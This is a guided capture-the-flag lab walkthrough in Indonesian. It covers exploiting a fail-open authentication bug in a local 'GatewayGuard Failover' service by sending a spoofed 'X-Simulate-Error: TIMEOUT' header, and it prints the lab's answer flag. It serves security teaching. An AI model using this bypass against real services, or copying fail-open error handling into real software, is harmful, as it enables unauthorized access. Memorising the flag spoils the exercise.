# Panduan Praktik Terbimbing: Investigasi Fail-Open Exception Handling in Auth Microservice

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **GatewayGuard Failover** pada `http://127.0.0.1:8059`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8059/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A10-02","port":8059,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8059/`
3. Amati antarmuka operasional **GatewayGuard Failover** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Fail-Open Exception Handling in Auth Microservice)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -H "X-Simulate-Error: TIMEOUT" http://127.0.0.1:8059/api/gate/check
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `X-Simulate-Error: TIMEOUT` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8059/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8059/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A10-02","flag":"ZITERA{f41l_0p3n_m1cr0s3rv1c3_byp4ss_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{f41l_0p3n_m1cr0s3rv1c3_byp4ss_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
